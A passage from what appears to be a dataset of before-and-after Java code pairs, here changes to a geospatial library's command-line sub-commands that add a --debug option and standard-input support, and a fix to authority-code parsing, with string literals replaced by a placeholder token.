 else   if (isCRS && (format.equalsIgnoreCase(""String_Node_Str"") || format.equalsIgnoreCase(""String_Node_Str""))) {
    outputFormat=Format.WKT;
    convention=Convention.WKT2;
  }
 else   if (isCRS && format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.WKT;
    convention=Convention.WKT1;
  }
 else   if (format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.XML;
  }
 else {
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,""String_Node_Str"",format),format);
  }
  Object metadata;
  if (useStandardInput()) {
    try (DataStore store=DataStores.open(System.in)){
      metadata=store.getMetadata();
    }
   }
 else {
    if (hasUnexpectedFileCount(1,1)) {
      return Command.INVALID_ARGUMENT_EXIT_CODE;
    }
    try (DataStore store=DataStores.open(files.get(0))){
      metadata=store.getMetadata();
    }
   }
  if (metadata == null) {
    return 0;
  }
  if (isCRS && (metadata instanceof Metadata)) {
    boolean found=false;
    for (    final ReferenceSystem rs : ((Metadata)metadata).getReferenceSystemInfo()) {
      if (rs instanceof CoordinateReferenceSystem) {
        metadata=rs;
        found=true;
        break;
      }
    }
    if (!found) {
      return 0;
    }
  }
switch (outputFormat) {
case TEXT:
{
      final TreeTable tree=MetadataStandard.ISO_19115.asTreeTable(metadata,ValueExistencePolicy.NON_EMPTY);
      final TreeTableFormat tf=new TreeTableFormat(locale,timezone);
      tf.setColumns(TableColumn.NAME,TableColumn.VALUE);
      tf.format(tree,out);
      break;
    }
case WKT:
{
    final WKTFormat f=new WKTFormat(locale,timezone);
    if (convention != null) {
      f.setConvention(convention);
    }
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    f.format(metadata,out);
    out.println();
    break;
  }
case XML:
{
  final MarshallerPool pool=new MarshallerPool(null);
  final Marshaller marshaller=pool.acquireMarshaller();
  marshaller.setProperty(XML.LOCALE,locale);
  marshaller.setProperty(XML.TIMEZONE,timezone);
  if (isConsole()) {
    marshaller.marshal(metadata,out);
  }
 else {
    out.flush();
    marshaller.setProperty(Marshaller.JAXB_ENCODING,encoding.name());
    marshaller.marshal(metadata,System.out);
    System.out.flush();
  }
  break;
}
}
out.flush();
return 0;
}"
91960,"/** 
 * Creates the   {@code ""mime-type""} sub-command.
 */
MimeTypeSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.ENCODING,Option.HELP));
}","/** 
 * Creates the   {@code ""mime-type""} sub-command.
 */
MimeTypeSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.ENCODING,Option.HELP,Option.DEBUG));
}"
91961,"/** 
 * Creates a new sub-command with the given command-line arguments. The   {@code arguments} array is the same array than the one given to the {@code main(String[])} method.The argument at index  {@code commandIndex} is the name of this command, and will be ignored except forthe special  {@value #TEST} value which is used only at JUnit testing time.
 * @param commandIndex Index of the {@code args} element containing the sub-command name.
 * @param arguments    The command-line arguments provided by the user.
 * @param validOptions The command-line options allowed by this sub-command.
 * @throws InvalidOptionException If an illegal option has been provided, or the option has an illegal value.
 */
protected SubCommand(final int commandIndex,final String[] arguments,final EnumSet<Option> validOptions) throws InvalidOptionException {
  boolean isTest=false;
  this.validOptions=validOptions;
  options=new EnumMap<>(Option.class);
  files=new ArrayList<>(arguments.length);
  for (int i=0; i < arguments.length; i++) {
    final String arg=arguments[i];
    if (i == commandIndex) {
      isTest=arg.equals(TEST);
      continue;
    }
    if (arg.startsWith(Option.PREFIX)) {
      final String name=arg.substring(Option.PREFIX.length());
      final Option option;
      try {
        option=Option.valueOf(name.toUpperCase(Locale.US));
      }
 catch (      IllegalArgumentException e) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),e,name);
      }
      if (!validOptions.contains(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),name);
      }
      String value=null;
      if (option.hasValue) {
        if (++i >= arguments.length) {
          throw new InvalidOptionException(Errors.format(Errors.Keys.MissingValueForOption_1,name),name);
        }
        value=arguments[i];
      }
      if (options.containsKey(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.DuplicatedOption_1,name),name);
      }
      options.put(option,value);
    }
 else {
      files.add(arg);
    }
  }
  Option option=null;
  String value=null;
  final Console console;
  final boolean explicitEncoding;
  try {
    value=options.get(option=Option.LOCALE);
    locale=(value != null) ? Locales.parse(value) : Locale.getDefault(Locale.Category.DISPLAY);
    value=options.get(option=Option.TIMEZONE);
    timezone=(value != null) ? TimeZone.getTimeZone(value) : TimeZone.getDefault();
    value=options.get(option=Option.ENCODING);
    explicitEncoding=(value != null);
    encoding=explicitEncoding ? Charset.forName(value) : Charset.defaultCharset();
    value=options.get(option=Option.COLORS);
    console=System.console();
    colors=(value != null) ? Option.COLORS.parseBoolean(value) : (console != null) && X364.isAnsiSupported();
  }
 catch (  RuntimeException e) {
    @SuppressWarnings(""String_Node_Str"") final String name=option.name().toLowerCase(Locale.US);
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,name,value),name);
  }
  if (isTest) {
    final StringWriter s=new StringWriter();
    outputBuffer=s.getBuffer();
    out=new PrintWriter(s);
    err=out;
  }
 else {
    outputBuffer=null;
    err=(console != null) ? console.writer() : new PrintWriter(System.err,true);
    if (!explicitEncoding && console != null) {
      out=console.writer();
    }
 else {
      if (explicitEncoding) {
        out=new PrintWriter(new OutputStreamWriter(System.out,encoding),true);
      }
 else {
        out=new PrintWriter(System.out,true);
      }
    }
  }
}","/** 
 * Creates a new sub-command with the given command-line arguments. The   {@code arguments} array is the same array than the one given to the {@code main(String[])} method.The argument at index  {@code commandIndex} is the name of this command, and will be ignored except forthe special  {@value #TEST} value which is used only at JUnit testing time.
 * @param commandIndex Index of the {@code args} element containing the sub-command name.
 * @param arguments    The command-line arguments provided by the user.
 * @param validOptions The command-line options allowed by this sub-command.
 * @throws InvalidOptionException If an illegal option has been provided, or the option has an illegal value.
 */
@SuppressWarnings(""String_Node_Str"") protected SubCommand(final int commandIndex,final String[] arguments,final EnumSet<Option> validOptions) throws InvalidOptionException {
  boolean isTest=false;
  this.validOptions=validOptions;
  options=new EnumMap<>(Option.class);
  files=new ArrayList<>(arguments.length);
  for (int i=0; i < arguments.length; i++) {
    final String arg=arguments[i];
    if (i == commandIndex) {
      isTest=arg.equals(TEST);
      continue;
    }
    if (arg.startsWith(Option.PREFIX)) {
      final String name=arg.substring(Option.PREFIX.length());
      final Option option;
      try {
        option=Option.valueOf(name.toUpperCase(Locale.US));
      }
 catch (      IllegalArgumentException e) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),e,name);
      }
      if (!validOptions.contains(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),name);
      }
      String value=null;
      if (option.hasValue) {
        if (++i >= arguments.length) {
          throw new InvalidOptionException(Errors.format(Errors.Keys.MissingValueForOption_1,name),name);
        }
        value=arguments[i];
      }
      if (options.containsKey(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.DuplicatedOption_1,name),name);
      }
      options.put(option,value);
    }
 else {
      files.add(arg);
    }
  }
  Option option=null;
  String value=null;
  final Console console;
  final boolean explicitEncoding;
  try {
    debug=options.containsKey(option=Option.DEBUG);
    value=options.get(option=Option.LOCALE);
    locale=(value != null) ? Locales.parse(value) : Locale.getDefault(Locale.Category.DISPLAY);
    value=options.get(option=Option.TIMEZONE);
    timezone=(value != null) ? TimeZone.getTimeZone(value) : TimeZone.getDefault();
    value=options.get(option=Option.ENCODING);
    explicitEncoding=(value != null);
    encoding=explicitEncoding ? Charset.forName(value) : Charset.defaultCharset();
    value=options.get(option=Option.COLORS);
    console=System.console();
    colors=(value != null) ? Option.COLORS.parseBoolean(value) : (console != null) && X364.isAnsiSupported();
  }
 catch (  RuntimeException e) {
    @SuppressWarnings(""String_Node_Str"") final String name=option.name().toLowerCase(Locale.US);
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,name,value),name);
  }
  if (isTest) {
    final StringWriter s=new StringWriter();
    outputBuffer=s.getBuffer();
    out=new PrintWriter(s);
    err=out;
  }
 else {
    outputBuffer=null;
    err=(console != null) ? console.writer() : new PrintWriter(System.err,true);
    if (!explicitEncoding && console != null) {
      out=console.writer();
    }
 else {
      if (explicitEncoding) {
        out=new PrintWriter(new OutputStreamWriter(System.out,encoding),true);
      }
 else {
        out=new PrintWriter(System.out,true);
      }
    }
  }
}"
91962,"/** 
 * Prints the given error message followed by the message in the given exception.
 * @param message The message to print before the exception, or {@code null}.
 * @param e The exception which occurred.
 */
final void error(final String message,final Exception e){
  out.flush();
  err.println(Exceptions.formatChainedMessages(locale,message,e));
}","/** 
 * Prints the given error message followed by the message in the given exception.
 * @param message The message to print before the exception, or {@code null}.
 * @param e The exception which occurred.
 */
final void error(final String message,final Exception e){
  out.flush();
  if (debug) {
    e.printStackTrace(err);
  }
 else {
    err.println(Exceptions.formatChainedMessages(locale,message,e));
  }
}"
91963,"/** 
 * Creates the   {@code ""about""} sub-command.
 */
AboutSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.BRIEF,Option.VERBOSE,Option.HELP));
}","/** 
 * Creates the   {@code ""about""} sub-command.
 */
AboutSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.BRIEF,Option.VERBOSE,Option.HELP,Option.DEBUG));
}"
91964,"/** 
 * Prints the information to the standard output stream.
 * @param args Command-line options.
 */
public static void main(final String[] args){
  final LogManager manager=LogManager.getLogManager();
  if (MonolineFormatter.class.getName().equals(manager.getProperty(ConsoleHandler.class.getName() + ""String_Node_Str""))) {
    MonolineFormatter.install();
  }
  final Command c;
  try {
    c=new Command(args);
  }
 catch (  InvalidCommandException e) {
    error(e);
    System.exit(INVALID_COMMAND_EXIT_CODE);
    return;
  }
catch (  InvalidOptionException e) {
    error(e);
    System.exit(INVALID_OPTION_EXIT_CODE);
    return;
  }
  int status;
  try {
    status=c.run();
  }
 catch (  Exception e) {
    status=exitCodeFor(e);
  }
  if (status != 0) {
    System.exit(status);
  }
}","/** 
 * Prints the information to the standard output stream.
 * @param args Command-line options.
 */
public static void main(final String[] args){
  final LogManager manager=LogManager.getLogManager();
  if (MonolineFormatter.class.getName().equals(manager.getProperty(ConsoleHandler.class.getName() + ""String_Node_Str""))) {
    MonolineFormatter.install();
  }
  final Command c;
  try {
    c=new Command(args);
  }
 catch (  InvalidCommandException e) {
    error(args,e);
    System.exit(INVALID_COMMAND_EXIT_CODE);
    return;
  }
catch (  InvalidOptionException e) {
    error(args,e);
    System.exit(INVALID_OPTION_EXIT_CODE);
    return;
  }
  int status;
  try {
    status=c.run();
  }
 catch (  Exception e) {
    status=exitCodeFor(e);
  }
  if (status != 0) {
    System.exit(status);
  }
}"
91965,"/** 
 * Prints the message of the given exception. This method is invoked only when the error occurred before the   {@link SubCommand} has been built, otherwise the {@link SubCommand#err} printer shall be used.
 */
private static void error(final Exception e){
  final Console console=System.console();
  if (console != null) {
    final PrintWriter err=console.writer();
    err.println(e.getLocalizedMessage());
    err.flush();
  }
 else {
    final PrintStream err=System.err;
    err.println(e.getLocalizedMessage());
    err.flush();
  }
}","/** 
 * Prints the message of the given exception. This method is invoked only when the error occurred before the   {@link SubCommand} has been built, otherwise the {@link SubCommand#err} printer shall be used.
 * @param args The command line arguments, used only for detecting if the {@code --debug} option was present.
 */
private static void error(final String[] args,final Exception e){
  final boolean debug=ArraysExt.containsIgnoreCase(args,Option.PREFIX + ""String_Node_Str"");
  final Console console=System.console();
  if (console != null) {
    final PrintWriter err=console.writer();
    if (debug) {
      e.printStackTrace(err);
    }
 else {
      err.println(e.getLocalizedMessage());
    }
    err.flush();
  }
 else {
    @SuppressWarnings(""String_Node_Str"") final PrintStream err=System.err;
    if (debug) {
      e.printStackTrace(err);
    }
 else {
      err.println(e.getLocalizedMessage());
    }
    err.flush();
  }
}"
91966,"/** 
 * Creates the   {@code ""help""} sub-command.
 */
HelpSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.ENCODING,Option.HELP));
}","/** 
 * Creates the   {@code ""help""} sub-command.
 */
HelpSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.ENCODING,Option.HELP,Option.DEBUG));
}"
91967,"/** 
 * Creates the   {@code ""metadata""} or {@code ""crs""} sub-command.
 * @param isCRS {@code true} for the {@code ""crs""} sub-command,or  {@code false} for the {@code ""metadata""} sub-command.
 */
MetadataSC(final boolean isCRS,final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.FORMAT,Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.COLORS,Option.HELP));
  this.isCRS=isCRS;
}","/** 
 * Creates the   {@code ""metadata""} or {@code ""crs""} sub-command.
 * @param isCRS {@code true} for the {@code ""crs""} sub-command,or  {@code false} for the {@code ""metadata""} sub-command.
 */
MetadataSC(final boolean isCRS,final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.FORMAT,Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.COLORS,Option.HELP,Option.DEBUG));
  this.isCRS=isCRS;
}"
91968,"/** 
 * Prints metadata or CRS information.
 * @throws DataStoreException If an error occurred while reading the file.
 * @throws JAXBException If an error occurred while producing the XML output.
 * @throws IOException Should never happen, since we are appending to a print writer.
 */
@Override public int run() throws InvalidOptionException, DataStoreException, JAXBException, IOException {
  Convention convention=null;
  final Format outputFormat;
  final String format=options.get(Option.FORMAT);
  if (format == null || format.equalsIgnoreCase(""String_Node_Str"")) {
    if (isCRS) {
      outputFormat=Format.WKT;
      convention=Convention.WKT2_SIMPLIFIED;
    }
 else {
      outputFormat=Format.TEXT;
    }
  }
 else   if (isCRS && (format.equalsIgnoreCase(""String_Node_Str"") || format.equalsIgnoreCase(""String_Node_Str""))) {
    outputFormat=Format.WKT;
    convention=Convention.WKT2;
  }
 else   if (isCRS && format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.WKT;
    convention=Convention.WKT1;
  }
 else   if (format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.XML;
  }
 else {
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,""String_Node_Str"",format),format);
  }
  if (hasUnexpectedFileCount(1,1)) {
    return Command.INVALID_ARGUMENT_EXIT_CODE;
  }
  final Metadata metadata;
  final DataStore store=DataStores.open(files.get(0));
  try {
    metadata=store.getMetadata();
  }
  finally {
    store.close();
  }
  if (metadata == null) {
    return 0;
  }
  Object object=metadata;
  if (isCRS) {
    boolean found=false;
    for (    final ReferenceSystem rs : metadata.getReferenceSystemInfo()) {
      if (rs instanceof CoordinateReferenceSystem) {
        object=(CoordinateReferenceSystem)rs;
        found=true;
        break;
      }
    }
    if (!found) {
      return 0;
    }
  }
switch (outputFormat) {
case TEXT:
{
      final TreeTable tree=MetadataStandard.ISO_19115.asTreeTable(metadata,ValueExistencePolicy.NON_EMPTY);
      final TreeTableFormat tf=new TreeTableFormat(locale,timezone);
      tf.setColumns(TableColumn.NAME,TableColumn.VALUE);
      tf.format(tree,out);
      break;
    }
case WKT:
{
    final WKTFormat f=new WKTFormat(locale,timezone);
    if (convention != null) {
      f.setConvention(convention);
    }
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    f.format(object,out);
    out.println();
    break;
  }
case XML:
{
  final MarshallerPool pool=new MarshallerPool(null);
  final Marshaller marshaller=pool.acquireMarshaller();
  marshaller.setProperty(XML.LOCALE,locale);
  marshaller.setProperty(XML.TIMEZONE,timezone);
  if (isConsole()) {
    marshaller.marshal(object,out);
  }
 else {
    out.flush();
    marshaller.setProperty(Marshaller.JAXB_ENCODING,encoding.name());
    marshaller.marshal(object,System.out);
    System.out.flush();
  }
  break;
}
}
out.flush();
return 0;
}","/** 
 * Prints metadata or CRS information.
 * @throws DataStoreException If an error occurred while reading the file.
 * @throws JAXBException If an error occurred while producing the XML output.
 * @throws IOException Should never happen, since we are appending to a print writer.
 */
@Override @SuppressWarnings(""String_Node_Str"") public int run() throws InvalidOptionException, DataStoreException, JAXBException, IOException {
  Convention convention=null;
  final Format outputFormat;
  final String format=options.get(Option.FORMAT);
  if (format == null || format.equalsIgnoreCase(""String_Node_Str"")) {
    if (isCRS) {
      outputFormat=Format.WKT;
      convention=Convention.WKT2_SIMPLIFIED;
    }
 else {
      outputFormat=Format.TEXT;
    }
  }
 else   if (isCRS && (format.equalsIgnoreCase(""String_Node_Str"") || format.equalsIgnoreCase(""String_Node_Str""))) {
    outputFormat=Format.WKT;
    convention=Convention.WKT2;
  }
 else   if (isCRS && format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.WKT;
    convention=Convention.WKT1;
  }
 else   if (format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.XML;
  }
 else {
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,""String_Node_Str"",format),format);
  }
  Object metadata;
  if (useStandardInput()) {
    DataStore store=DataStores.open(System.in);
    try {
      metadata=store.getMetadata();
    }
  finally {
      store.close();
    }
  }
 else {
    if (hasUnexpectedFileCount(1,1)) {
      return Command.INVALID_ARGUMENT_EXIT_CODE;
    }
    DataStore store=DataStores.open(files.get(0));
    try {
      metadata=store.getMetadata();
    }
  finally {
      store.close();
    }
  }
  if (metadata == null) {
    return 0;
  }
  if (isCRS && (metadata instanceof Metadata)) {
    boolean found=false;
    for (    final ReferenceSystem rs : ((Metadata)metadata).getReferenceSystemInfo()) {
      if (rs instanceof CoordinateReferenceSystem) {
        metadata=rs;
        found=true;
        break;
      }
    }
    if (!found) {
      return 0;
    }
  }
switch (outputFormat) {
case TEXT:
{
      final TreeTable tree=MetadataStandard.ISO_19115.asTreeTable(metadata,ValueExistencePolicy.NON_EMPTY);
      final TreeTableFormat tf=new TreeTableFormat(locale,timezone);
      tf.setColumns(TableColumn.NAME,TableColumn.VALUE);
      tf.format(tree,out);
      break;
    }
case WKT:
{
    final WKTFormat f=new WKTFormat(locale,timezone);
    if (convention != null) {
      f.setConvention(convention);
    }
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    f.format(metadata,out);
    out.println();
    break;
  }
case XML:
{
  final MarshallerPool pool=new MarshallerPool(null);
  final Marshaller marshaller=pool.acquireMarshaller();
  marshaller.setProperty(XML.LOCALE,locale);
  marshaller.setProperty(XML.TIMEZONE,timezone);
  if (isConsole()) {
    marshaller.marshal(metadata,out);
  }
 else {
    out.flush();
    marshaller.setProperty(Marshaller.JAXB_ENCODING,encoding.name());
    marshaller.marshal(metadata,System.out);
    System.out.flush();
  }
  break;
}
}
out.flush();
return 0;
}"
91969,"/** 
 * Creates the   {@code ""mime-type""} sub-command.
 */
MimeTypeSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.ENCODING,Option.HELP));
}","/** 
 * Creates the   {@code ""mime-type""} sub-command.
 */
MimeTypeSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.ENCODING,Option.HELP,Option.DEBUG));
}"
91970,"/** 
 * Creates a new sub-command with the given command-line arguments. The   {@code arguments} array is the same array than the one given to the {@code main(String[])} method.The argument at index  {@code commandIndex} is the name of this command, and will be ignored except forthe special  {@value #TEST} value which is used only at JUnit testing time.
 * @param commandIndex Index of the {@code args} element containing the sub-command name.
 * @param arguments    The command-line arguments provided by the user.
 * @param validOptions The command-line options allowed by this sub-command.
 * @throws InvalidOptionException If an illegal option has been provided, or the option has an illegal value.
 */
protected SubCommand(final int commandIndex,final String[] arguments,final EnumSet<Option> validOptions) throws InvalidOptionException {
  boolean isTest=false;
  this.validOptions=validOptions;
  options=new EnumMap<Option,String>(Option.class);
  files=new ArrayList<String>(arguments.length);
  for (int i=0; i < arguments.length; i++) {
    final String arg=arguments[i];
    if (i == commandIndex) {
      isTest=arg.equals(TEST);
      continue;
    }
    if (arg.startsWith(Option.PREFIX)) {
      final String name=arg.substring(Option.PREFIX.length());
      final Option option;
      try {
        option=Option.valueOf(name.toUpperCase(Locale.US));
      }
 catch (      IllegalArgumentException e) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),e,name);
      }
      if (!validOptions.contains(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),name);
      }
      String value=null;
      if (option.hasValue) {
        if (++i >= arguments.length) {
          throw new InvalidOptionException(Errors.format(Errors.Keys.MissingValueForOption_1,name),name);
        }
        value=arguments[i];
      }
      if (options.containsKey(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.DuplicatedOption_1,name),name);
      }
      options.put(option,value);
    }
 else {
      files.add(arg);
    }
  }
  Option option=null;
  String value=null;
  final Console console;
  final boolean explicitEncoding;
  try {
    value=options.get(option=Option.LOCALE);
    locale=(value != null) ? Locales.parse(value) : Locale.getDefault();
    value=options.get(option=Option.TIMEZONE);
    timezone=(value != null) ? TimeZone.getTimeZone(value) : TimeZone.getDefault();
    value=options.get(option=Option.ENCODING);
    explicitEncoding=(value != null);
    encoding=explicitEncoding ? Charset.forName(value) : Charset.defaultCharset();
    value=options.get(option=Option.COLORS);
    console=System.console();
    colors=(value != null) ? Option.COLORS.parseBoolean(value) : (console != null) && X364.isAnsiSupported();
  }
 catch (  RuntimeException e) {
    @SuppressWarnings(""String_Node_Str"") final String name=option.name().toLowerCase(Locale.US);
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,name,value),name);
  }
  if (isTest) {
    final StringWriter s=new StringWriter();
    outputBuffer=s.getBuffer();
    out=new PrintWriter(s);
    err=out;
  }
 else {
    outputBuffer=null;
    err=(console != null) ? console.writer() : new PrintWriter(System.err,true);
    if (!explicitEncoding && console != null) {
      out=console.writer();
    }
 else {
      if (explicitEncoding) {
        out=new PrintWriter(new OutputStreamWriter(System.out,encoding),true);
      }
 else {
        out=new PrintWriter(System.out,true);
      }
    }
  }
}","/** 
 * Creates a new sub-command with the given command-line arguments. The   {@code arguments} array is the same array than the one given to the {@code main(String[])} method.The argument at index  {@code commandIndex} is the name of this command, and will be ignored except forthe special  {@value #TEST} value which is used only at JUnit testing time.
 * @param commandIndex Index of the {@code args} element containing the sub-command name.
 * @param arguments    The command-line arguments provided by the user.
 * @param validOptions The command-line options allowed by this sub-command.
 * @throws InvalidOptionException If an illegal option has been provided, or the option has an illegal value.
 */
@SuppressWarnings(""String_Node_Str"") protected SubCommand(final int commandIndex,final String[] arguments,final EnumSet<Option> validOptions) throws InvalidOptionException {
  boolean isTest=false;
  this.validOptions=validOptions;
  options=new EnumMap<Option,String>(Option.class);
  files=new ArrayList<String>(arguments.length);
  for (int i=0; i < arguments.length; i++) {
    final String arg=arguments[i];
    if (i == commandIndex) {
      isTest=arg.equals(TEST);
      continue;
    }
    if (arg.startsWith(Option.PREFIX)) {
      final String name=arg.substring(Option.PREFIX.length());
      final Option option;
      try {
        option=Option.valueOf(name.toUpperCase(Locale.US));
      }
 catch (      IllegalArgumentException e) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),e,name);
      }
      if (!validOptions.contains(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),name);
      }
      String value=null;
      if (option.hasValue) {
        if (++i >= arguments.length) {
          throw new InvalidOptionException(Errors.format(Errors.Keys.MissingValueForOption_1,name),name);
        }
        value=arguments[i];
      }
      if (options.containsKey(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.DuplicatedOption_1,name),name);
      }
      options.put(option,value);
    }
 else {
      files.add(arg);
    }
  }
  Option option=null;
  String value=null;
  final Console console;
  final boolean explicitEncoding;
  try {
    debug=options.containsKey(option=Option.DEBUG);
    value=options.get(option=Option.LOCALE);
    locale=(value != null) ? Locales.parse(value) : Locale.getDefault();
    value=options.get(option=Option.TIMEZONE);
    timezone=(value != null) ? TimeZone.getTimeZone(value) : TimeZone.getDefault();
    value=options.get(option=Option.ENCODING);
    explicitEncoding=(value != null);
    encoding=explicitEncoding ? Charset.forName(value) : Charset.defaultCharset();
    value=options.get(option=Option.COLORS);
    console=System.console();
    colors=(value != null) ? Option.COLORS.parseBoolean(value) : (console != null) && X364.isAnsiSupported();
  }
 catch (  RuntimeException e) {
    @SuppressWarnings(""String_Node_Str"") final String name=option.name().toLowerCase(Locale.US);
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,name,value),name);
  }
  if (isTest) {
    final StringWriter s=new StringWriter();
    outputBuffer=s.getBuffer();
    out=new PrintWriter(s);
    err=out;
  }
 else {
    outputBuffer=null;
    err=(console != null) ? console.writer() : new PrintWriter(System.err,true);
    if (!explicitEncoding && console != null) {
      out=console.writer();
    }
 else {
      if (explicitEncoding) {
        out=new PrintWriter(new OutputStreamWriter(System.out,encoding),true);
      }
 else {
        out=new PrintWriter(System.out,true);
      }
    }
  }
}"
91971,"/** 
 * Prints the given error message followed by the message in the given exception.
 * @param message The message to print before the exception, or {@code null}.
 * @param e The exception which occurred.
 */
final void error(final String message,final Exception e){
  out.flush();
  err.println(Exceptions.formatChainedMessages(locale,message,e));
}","/** 
 * Prints the given error message followed by the message in the given exception.
 * @param message The message to print before the exception, or {@code null}.
 * @param e The exception which occurred.
 */
final void error(final String message,final Exception e){
  out.flush();
  if (debug) {
    e.printStackTrace(err);
  }
 else {
    err.println(Exceptions.formatChainedMessages(locale,message,e));
  }
}"
91972,"/** 
 * Creates an object from a code using the given proxy.
 * @param < T >   The type of the object to be returned.
 * @param proxy The proxy to use for creating the object.
 * @param code  The code of the object to create.
 * @return The object from one of the authority factory specified at construction time.
 * @throws FactoryException If an error occurred while creating the object.
 */
final <T>T create(AuthorityFactoryProxy<? extends T> proxy,String code) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",code);
  final String authority, version;
  final String[] parameters;
  final DefinitionURI uri=DefinitionURI.parse(code);
  if (uri != null) {
    final Class<? extends T> type=proxy.type;
    authority=uri.authority;
    version=uri.version;
    code=uri.code;
    parameters=uri.parameters;
    proxy=proxy.specialize(uri.type);
    if (code == null || proxy == null) {
      final String s=uri.toString();
      final String message;
      if (code == null) {
        message=Errors.format(Errors.Keys.MissingComponentInElement_2,s,""String_Node_Str"");
      }
 else {
        message=Errors.format(Errors.Keys.CanNotCreateObjectOfType_2,type,uri.type);
      }
      throw new NoSuchAuthorityCodeException(message,authority,code,s);
    }
  }
 else {
    int afterAuthority=code.indexOf(DefaultNameSpace.DEFAULT_SEPARATOR);
    int end=CharSequences.skipTrailingWhitespaces(code,0,afterAuthority);
    int start=CharSequences.skipLeadingWhitespaces(code,0,end);
    if (start >= end) {
      throw new NoSuchAuthorityCodeException(Errors.format(Errors.Keys.MissingAuthority_1,code),null,code);
    }
    authority=code.substring(start,end);
    int afterVersion=code.indexOf(DefaultNameSpace.DEFAULT_SEPARATOR,++afterAuthority);
    start=CharSequences.skipLeadingWhitespaces(code,afterAuthority,afterVersion);
    end=CharSequences.skipTrailingWhitespaces(code,start,afterVersion);
    version=(start < end && !code.regionMatches(start,DefinitionURI.NO_VERSION,0,DefinitionURI.NO_VERSION.length())) ? code.substring(start,end) : null;
    code=CharSequences.trimWhitespaces(code,Math.max(afterAuthority,afterVersion + 1),code.length()).toString();
    parameters=null;
  }
  if (parameters != null || code.indexOf(CommonAuthorityFactory.SEPARATOR) >= 0) {
    final StringBuilder buffer=new StringBuilder(authority.length() + code.length() + 1).append(authority).append(DefaultNameSpace.DEFAULT_SEPARATOR).append(code);
    if (parameters != null) {
      for (      final String p : parameters) {
        buffer.append(CommonAuthorityFactory.SEPARATOR).append(p);
      }
    }
    code=buffer.toString();
  }
  return proxy.createFromAPI(getAuthorityFactory(AuthorityFactoryIdentifier.create(proxy.factoryType,authority,version)),code);
}","/** 
 * Creates an object from a code using the given proxy.
 * @param < T >   The type of the object to be returned.
 * @param proxy The proxy to use for creating the object.
 * @param code  The code of the object to create.
 * @return The object from one of the authority factory specified at construction time.
 * @throws FactoryException If an error occurred while creating the object.
 */
final <T>T create(AuthorityFactoryProxy<? extends T> proxy,String code) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",code);
  final String authority, version;
  final String[] parameters;
  final DefinitionURI uri=DefinitionURI.parse(code);
  if (uri != null) {
    if (uri.authority == null) {
      throw new NoSuchAuthorityCodeException(Errors.format(Errors.Keys.MissingAuthority_1,code),null,uri.code,code);
    }
    final Class<? extends T> type=proxy.type;
    authority=uri.authority;
    version=uri.version;
    code=uri.code;
    parameters=uri.parameters;
    proxy=proxy.specialize(uri.type);
    if (code == null || proxy == null) {
      final String s=uri.toString();
      final String message;
      if (code == null) {
        message=Errors.format(Errors.Keys.MissingComponentInElement_2,s,""String_Node_Str"");
      }
 else {
        message=Errors.format(Errors.Keys.CanNotCreateObjectOfType_2,type,uri.type);
      }
      throw new NoSuchAuthorityCodeException(message,authority,code,s);
    }
  }
 else {
    int afterAuthority=code.indexOf(DefaultNameSpace.DEFAULT_SEPARATOR);
    int end=CharSequences.skipTrailingWhitespaces(code,0,afterAuthority);
    int start=CharSequences.skipLeadingWhitespaces(code,0,end);
    if (start >= end) {
      throw new NoSuchAuthorityCodeException(Errors.format(Errors.Keys.MissingAuthority_1,code),null,code);
    }
    authority=code.substring(start,end);
